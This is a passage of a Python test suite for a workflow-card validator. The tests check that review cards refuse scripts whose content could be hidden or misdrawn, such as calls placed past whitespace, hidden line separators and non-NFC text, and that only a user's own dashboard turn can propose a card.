    ) in exc.value.message


def test_a_non_ascii_character_in_a_multi_line_string_names_its_own_line():
    source = SOURCE_V1 + 'PROMPT = """\nfirst\nsecond caf\u00e9\n"""\n'
    with pytest.raises(catalog.CardCatalogError) as exc:
        catalog.validate_params(SAVE, _save_params(source=source))
    assert "U+00E9 on line 6" in exc.value.message


def test_a_script_that_cannot_be_tokenized_is_refused():
    source = SOURCE_V1 + "X = (\n"
    with pytest.raises(catalog.CardCatalogError) as exc:
        catalog.validate_params(SAVE, _save_params(source=source))
    assert exc.value.code == "invalid_param"
    assert "Python tokens" in exc.value.message


@pytest.mark.parametrize("kind", [SAVE, UPDATE])
def test_a_decomposed_accent_in_a_comment_is_refused_as_not_nfc(kind):
    # ``e`` + U+0301 draws like the precomposed ``é`` yet is other text.
    source = SOURCE_V1 + "CMD = 'x'\n# cafe\u0301\n"
    params = _save_params(source=source) if kind == SAVE else {"workflow": "x", "source": source}
    with pytest.raises(catalog.CardCatalogError) as exc:
        catalog.validate_params(kind, params)
    assert exc.value.code == "invalid_param"
    assert "line 5 is not in Unicode NFC form" in exc.value.message


@pytest.mark.parametrize(
    "line,needle",
    [
        ("X = 1  # " + "a" * (catalog.WORKFLOW_LINE_MAX - 8), "161 characters long"),
        # The call sits past a run of spaces, out of sight on the card.
        ("if CMD:\n    pass" + " " * 10 + "; x()", "run of 8 or more spaces"),
        ("X = 1\t# note", "a tab after its first non-blank character"),
        ("if CMD:\n    pass\t; x()", "a tab after its first non-blank character"),
    ],
)
@pytest.mark.parametrize("kind", [SAVE, UPDATE])
def test_a_line_whose_end_the_card_would_hide_is_refused(kind, line, needle):
    source = SOURCE_V1 + "CMD = 'x'\n" + line + "\n"
    params = _save_params(source=source) if kind == SAVE else {"workflow": "x", "source": source}
    with pytest.raises(catalog.CardCatalogError) as exc:
        catalog.validate_params(kind, params)
    assert exc.value.code == "invalid_param"
    assert needle in exc.value.message


def test_a_line_at_the_cap_and_leading_indentation_still_save():
    line = "X = 1  # " + "a" * (catalog.WORKFLOW_LINE_MAX - 9)
    assert len(line) == catalog.WORKFLOW_LINE_MAX
    source = SOURCE_V1 + line + "\nif X:\n        Y = 1  # seven spaces:       ok\n"
    assert catalog.validate_params(SAVE, _save_params(source=source))["source"] == source.strip()


@pytest.mark.parametrize(
    "indent,columns",
    [
        (" " * (catalog.WORKFLOW_INDENT_MAX + 1), catalog.WORKFLOW_INDENT_MAX + 1),
        # A tab counts to the next multiple of 8 columns.
        ("\t" * 5 + " ", catalog.WORKFLOW_INDENT_MAX + 1),
    ],
)
@pytest.mark.parametrize("kind", [SAVE, UPDATE])
def test_a_line_indented_past_the_cap_is_refused_and_named(kind, indent, columns):
    # Inside a string, so only the cap (not Python's indentation) decides.
    source = SOURCE_V1 + 'PROMPT = """\n' + indent + 'x()\n"""\n'
    params = _save_params(source=source) if kind == SAVE else {"workflow": "x", "source": source}
    with pytest.raises(catalog.CardCatalogError) as exc:
        catalog.validate_params(kind, params)
    assert exc.value.code == "invalid_param"
    assert f"line 5 is indented {columns} columns" in exc.value.message
    assert f"at most {catalog.WORKFLOW_INDENT_MAX}" in exc.value.message


def test_a_line_indented_exactly_to_the_cap_still_saves():
    source = SOURCE_V1 + 'PROMPT = """\n' + " " * catalog.WORKFLOW_INDENT_MAX + 'x()\n"""\n'
    assert catalog.validate_params(SAVE, _save_params(source=source))["source"] == source.strip()


@pytest.mark.parametrize("mark", ["\u0346", "\u20dd"])
@pytest.mark.parametrize("kind", [SAVE, UPDATE])
def test_three_combining_marks_in_a_comment_are_refused(kind, mark):
    # U+0346 (Mn) and U+20DD (Me) compose with nothing, so the text is NFC and only
    # the stacking rule refuses it.
    source = SOURCE_V1 + "CMD = 'x'\n# a" + mark * 3 + "\n"
    params = _save_params(source=source) if kind == SAVE else {"workflow": "x", "source": source}
    with pytest.raises(catalog.CardCatalogError) as exc:
        catalog.validate_params(kind, params)
    assert exc.value.code == "invalid_param"
    assert "line 5 stacks more than 2 combining marks in a row" in exc.value.message


def test_two_combining_marks_in_a_comment_still_save():
    source = SOURCE_V1 + "CMD = 'x'\n# a\u0346\u0346\n"
    assert catalog.validate_params(SAVE, _save_params(source=source))["source"] == source.strip()


@pytest.mark.parametrize("kind", [SAVE, UPDATE])
def test_a_russian_prompt_string_is_refused_on_a_card(kind):
    source = SOURCE_V1 + (
        'PROMPT = "\\n\u041d\u0430\u0439\u0434\u0438 \u043f\u0440\u0438\u0447\u0438\u043d\u0443 '
        "\u043e\u0448\u0438\u0431\u043a\u0438 \u0438 \u043e\u043f\u0438\u0448\u0438 "
        '\u0435\u0451 \u0432 \u043e\u0434\u043d\u043e\u043c \u0430\u0431\u0437\u0430\u0446\u0435."\n'
        'ASK = f"\u0421\u043f\u0440\u043e\u0441\u0438 {CMD} \u0441\u043d\u0430\u0447\u0430\u043b\u0430"\n'
        # A Cyrillic word with no Latin look-alike may be a key.
        'LABELS = {"\u043a\u043b\u044e\u0447": PROMPT}\n'
    )
    source = source.replace("async def", "CMD = 'x'\nasync def")
    params = _save_params(source=source) if kind == SAVE else {"workflow": "x", "source": source}
    # The accepted trade-off: non-English prompts save from the Workflows tab only.
    with pytest.raises(catalog.CardCatalogError) as exc:
        catalog.validate_params(kind, params)
    assert exc.value.code == "invalid_param"
    assert "U+041D on line 5" in exc.value.message
    assert "save it from the Workflows tab instead" in exc.value.message


def test_the_diff_splits_lines_only_where_python_does():
    # Saved from the Workflows tab: ``LIMIT = 2`` sits inside the comment.
    old = SOURCE_V1 + "# keep\u2028LIMIT = 2\n"
    new = SOURCE_V1 + "# keep\nLIMIT = 2\n"
    lines = cards._workflow_diff(old, new).split("\n")
    # The removed line's separator is spelled out, so it draws as one row.
    assert "-# keep\\u2028LIMIT = 2" in lines
    assert "+# keep" in lines and "+LIMIT = 2" in lines


def test_a_script_change_no_diff_line_shows_is_still_a_change_with_the_script_open():
    p = catalog.validate_params(UPDATE, {"workflow": "investigate", "source": SOURCE_V2})
    preview = catalog.build_preview(
        UPDATE, p, _update_snapshot(), {"diff": "", "source_changed": True}
    )
    rows = {row["label"]: row for row in preview["changes"]}
    assert "Changes to the script" not in rows
    # With no diff to read, the whole new script is in the open, not under Details.
    assert rows["Script"] == {
        "field": "workflow_source",
        "label": "Script",
        "after": SOURCE_V2.strip(),
    }
    assert preview["apply"][0]["body"]["source"] == SOURCE_V2.strip()


def test_an_update_from_a_hidden_line_break_shows_the_line_python_runs(tmp_path, monkeypatch):
    library = WorkflowDefinitionLibrary(tmp_path)
    old = SOURCE_V1 + "# keep\u2028LIMIT = 2\n"
    library.create(source=old, name="Investigate", slug="investigate")
    state = _State(_Service(library))

    async def go(c):
        new = SOURCE_V1 + "# keep\nLIMIT = 2\n"
        r = await _propose(c, UPDATE, {"workflow": "investigate", "source": new})
        assert r.status == 200, await r.text()
        rows = {row["label"]: row for row in (await r.json())["changes"]}
        assert "+LIMIT = 2" in rows["Changes to the script"]["after"].split("\n")
        assert rows["Script"]["detail"] is True

    _run(state, go, monkeypatch)


def test_a_save_without_a_slug_shows_and_pins_the_derived_command():
    p = catalog.validate_params(SAVE, _save_params(name="Investigate the Build"))
    preview = catalog.build_preview(SAVE, p, {}, {})
    rows = {row["label"]: row for row in preview["changes"]}
    assert rows["Command"]["after"] == "/workflow investigate-the-build"
    body = preview["apply"][0]["body"]
    assert (body["slug"], body["exact_slug"]) == ("investigate-the-build", True)
    with pytest.raises(catalog.CardCatalogError) as exc:
        catalog.build_preview(SAVE, p, {"slug_taken": True}, {})
    assert exc.value.code == "slug_taken"
    assert "/workflow investigate-the-build" in exc.value.message


def test_a_save_without_a_slug_is_never_suffixed(tmp_path, monkeypatch):
    library = WorkflowDefinitionLibrary(tmp_path)
    state = _State(_Service(library))

    async def go(c):
        # The name derives a command that is already saved: no card.
        library.create(source=SOURCE_V1, name="Investigate", slug="investigate")
        r = await _propose(c, SAVE, _save_params())
        assert r.status == 400, await r.text()
        assert (await r.json())["code"] == "slug_taken"
        # Free at the preview, taken after Apply's re-read: the create refuses
        # instead of saving under ``/workflow fresh-2``.
        r = await _propose(c, SAVE, _save_params(name="Fresh"))
        assert r.status == 200, await r.text()
        card = await r.json()
        step = card["plan"]["apply"][0]
        assert (step["body"]["slug"], step["body"]["exact_slug"]) == ("fresh", True)
        library.create(source=SOURCE_V1, name="Other", slug="fresh")
        r = await c.post(step["path"], json=step["body"], headers=_step(card))
        assert r.status == 409, await r.text()
        assert sorted(d["slug"] for d in library.list()) == ["fresh", "investigate"]

    _run(state, go, monkeypatch)


def _refused_caller(state: _State, caller: str) -> dict[str, str]:
    """Headers for *caller*, set up on *state*, that the shared caller check refuses."""
    if caller == "app":
        return {**AGENT, "X-Test-App": "some-app"}
    if caller == "subagent":
        return {"X-Test-Auth": "internal", "X-Session-Key": "subagent:abc"}
    if caller in ("cron", "workflow_run"):
        key = "cron-job1" if caller == "cron" else "workflow-run1"
        state._slots[key] = in_dashboard_turn(_ChatSlot(key))
        return {"X-Test-Auth": "internal", "X-Session-Key": key}
    slot = state._slots[SLOT]
    if caller == "channel":
        slot._turn_channel_origin = True
    else:  # a loop wake, a cron or app injection, a session_send
        slot._turn_user_sent = False
    return AGENT


@pytest.mark.parametrize(
    "caller,code",
    [
        ("app", "app_caller"),
        ("subagent", "subagent_caller"),
        ("cron", "unattended_caller"),
        ("workflow_run", "unattended_caller"),
        ("channel", "channel_caller"),
        ("injected_turn", "not_user_turn"),
    ],
)
@pytest.mark.parametrize("kind", [SAVE, UPDATE])
def test_only_a_users_dashboard_turn_can_propose_a_workflow_card(
    tmp_path, monkeypatch, kind, caller, code
):
    library = WorkflowDefinitionLibrary(tmp_path)
    library.create(source=SOURCE_V1, name="Investigate", slug="investigate")
    state = _State(_Service(library))
    headers = _refused_caller(state, caller)
    params = (
        _save_params(name="Fresh")
        if kind == SAVE
        else {"workflow": "investigate", "source": SOURCE_V2}
    )

    async def go(c):
        r = await _propose(c, kind, params, headers=headers)
        assert r.status == 403, await r.text()
        assert (await r.json())["code"] == code
        assert state._change_card_store.pending(None) == []

    _run(state, go, monkeypatch)
